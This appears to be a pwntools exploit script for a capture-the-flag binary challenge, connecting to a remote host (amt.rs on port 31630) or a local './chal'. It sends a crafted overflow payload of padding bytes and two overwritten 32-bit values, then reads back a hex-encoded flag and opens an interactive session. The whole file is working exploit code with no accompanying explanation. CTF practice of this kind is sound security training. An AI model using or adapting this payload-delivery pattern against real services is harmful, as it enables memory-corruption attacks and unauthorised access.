#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chal"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("amt.rs", 31630)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		#b *main+117
		b *main+147
		#b *main+152
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

def hex_to_ascii(hex_string):
    hex_bytes = bytes.fromhex(hex_string)
    ascii_string = hex_bytes.decode('ascii')
    return ascii_string


payload = b"A" * 8 * 3
payload += p32(0)
payload += p32(0xffffffc0)

p.recvuntil(":")
p.sendline(payload)

flag = hex_to_ascii(p.recvuntil(b"00").rstrip().decode())
log.info("Flag: " + flag)


p.interactive()
